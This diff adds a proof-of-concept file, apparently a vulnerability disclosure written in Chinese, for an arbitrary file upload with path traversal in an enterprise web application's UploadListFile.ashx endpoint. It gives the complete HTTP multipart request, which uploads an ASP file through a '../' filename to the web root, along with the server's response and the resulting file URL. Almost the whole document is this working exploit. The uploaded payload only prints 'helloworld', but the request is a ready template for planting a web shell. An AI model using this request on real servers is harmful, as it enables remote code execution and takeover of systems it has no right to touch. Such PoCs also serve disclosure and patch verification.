@@ -1,0 +1,26 @@
+POC：
+
+POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+Content-Length: 258
+Accept: /
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
+
+-----------------------------rww5upkbw6ctf0tu5hye
+Content-Disposition: form-data; name="file"; filename="../../../../../../helloworld.asp"
+Content-Type: image/png
+
+<% response.write("helloworld")%>
+-----------------------------rww5upkbw6ctf0tu5hye--
+
+响应包：
+
+{'jsonrpc' : '2.0', 'result' : "common/commonlib/20240831/01f77a78-47d1-45d8-af86-7b3db4b3c45b/..%2f..%2f..%2f..%2f..%2f..%2fhelloworld.asp", 'id' : ''}
+
+文件上传路径：
+
+http://127.0.0.1/cwbase/helloworld.asp
